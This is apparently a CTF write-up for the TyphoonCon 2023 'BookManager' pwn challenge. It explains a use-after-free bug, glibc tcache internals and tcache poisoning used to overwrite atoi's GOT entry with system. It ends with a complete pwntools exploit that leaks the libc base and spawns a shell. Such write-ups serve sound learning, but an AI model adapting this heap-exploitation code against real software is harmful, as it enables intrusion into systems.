---
layout:     post
title:      BookManager [TyphoonConCTF 23]
date:       2023-06-30 04:30:00
summary:    WriteUp for challenge BookManager in TyphoonCon CTF
categories: 
- CTF
thumbnail: flag
tags:
- Pwning
---

This is a writeUp for challenge bookManager which was one of the three pwning challenges in typhoonCon CTF 2023. It is a fairly easy challenge given some knowledge of heap internals (tcache).

## Code analysis
The main function is a simple while loop containing a switch statement, having calls to other functions.
![main function](/images/2023-06-30-typhooncon-BookManager/main.png)

The important ones for us are the following

![new_book function](/images/2023-06-30-typhooncon-BookManager/new_book.png)
`new_book()` allocates a new slot (book) for us. It can allocate upto 5 books and it picks up the first empty slot and fills it with a malloc allocation of the size we specify.

![edit_book function](/images/2023-06-30-typhooncon-BookManager/edit_book.png)
`edit_book()` takes an index verifies that it is valid and not null and writes data to the allocation from `new_book()`. There seems to be no overflow here.

![show_book function](/images/2023-06-30-typhooncon-BookManager/show_book.png)
`show_book()` simply prints out an allocation at a given index if it is not null. This can be used for information disclosure.

![delete_book function](/images/2023-06-30-typhooncon-BookManager/delete_book.png)
`delete_book()` deletes the allocation using free but does not null out the pointer in `books` array resulting in a dangling pointer and this is where the bug lies.

## Background on tcache
tcache is a cache structure on top of the heap allocator bins and it contains recently freed allocations of sizes 24 to 1032 in bins of specified sizes. In ptmalloc2 allocations happen as chunks, i.e., tcache contains free chunks. the chunk structure is as follows
```
struct chunk{
size_t previous_size;
size_t size;
struct chunk* next;
struct chunk* prev;
// remaining data follows
};
```
the `previous_size` is size of the previous chunk in memory. `size` is size of the current chunk and `next` and `prev` are pointers to other chunks in a doubly linked list. However, in case of tcache only the `next` pointer is used and `prev` is unused as chunks in one bin are put in a singly linked list in a LIFO manner. 

Also note that, malloc returns the address of `next` pointer as start of the buffer not the start of the chunk, so, `next` pointer occupies the first few bytes of a free malloc buffer, but when allocated the same space has user data. Consider the following code.

```
a = malloc(0x10);
b = malloc(0x10);

free(a);
free(b);

c = malloc(0x10); // b is returned
d = malloc(0x10); // a is returned
```

the following image shows how deallocations happen. Note that now `b` will be allocated before `a`.
![tcache](/images/2023-06-30-typhooncon-BookManager/tcache.png)

The important thing to note here is that the free chunks are in a singly linked list. if any of the next pointers is corrupted allocations will happen from a corrupted linked list and malloc can be made to return manipulated addresses as allocations. This is exactly what we do in this challenge.

## Exploitation

### Main Idea

If we `delete_book()` an allocation and then `edit_book()` on it, we can modify the next pointer of the book so the second `new_book()` with the same size will return an allocation with the address we wrote using `edit_book()`.

This gives us arbitrary read primitive using `show_book()` and arbitrary write using `edit_book()`.

### atoi

Since it is partial RELRO and no PIE we can easily overwrite `.got` entry for `atoi`. `atoi` is called in every iteration of the main loop in `read_int` here is a decompilation for completeness.
![read_int](/images/2023-06-30-typhooncon-BookManager/read_int.png)

We first get an allocation with the address of `.got` entry for `atoi` using our `edit_book()` method. We read address of `atoi` and get libc base address from there and then write address of `system` in the `.got` entry.

So in the next loop we send `"/bin/sh"` in the next iteration of main loop giving us shell.

## Full Exploit

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./task")
libc = ELF("./libc-2.27.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("0.cloud.chals.io", 29394)

    return r

r = conn()

def malloc(sz) :
    r.recvuntil(b'>> ')
    r.send(b'1')
    r.recvuntil(b'size:\n')
    r.send(bytes(str(sz), 'ascii'))

def free(idx) :
    r.recvuntil(b'>> ')
    r.send(b'3')
    r.recvuntil(b'index:\n')
    r.send(bytes(str(idx), 'ascii'))

def show(idx) :
    r.recvuntil(b'>> ')
    r.send(b'4')
    r.recvuntil(b'index:\n')
    r.send(bytes(str(idx), 'ascii'))
    r.recvuntil(b'OUTPUT: ')
    return r.recvline()

def edit(idx, content) :
    r.recvuntil(b'>> ')
    r.send(b'2')
    r.recvuntil(b'index:\n')
    r.send(bytes(str(idx), 'ascii'))
    r.recvuntil(b'content:\n')
    r.send(content)

def main():

    malloc(0x10)
    free(0)
    edit(0, p64(exe.got['atoi']))
    malloc(0x10)
    malloc(0x10)
    libc.address = u64(show(2)[:6].ljust(8, b'\x00')) - libc.symbols['atoi']
    print(f"LIBC ADDRESS : {hex(libc.address)}")
    edit(2, p64(libc.symbols['system']))
    r.send(b'/bin/sh\x00')
    r.recvuntil(b'>> ')
    r.send(b'/bin/sh \x00')
    r.interactive()


if __name__ == "__main__":
    main()

```

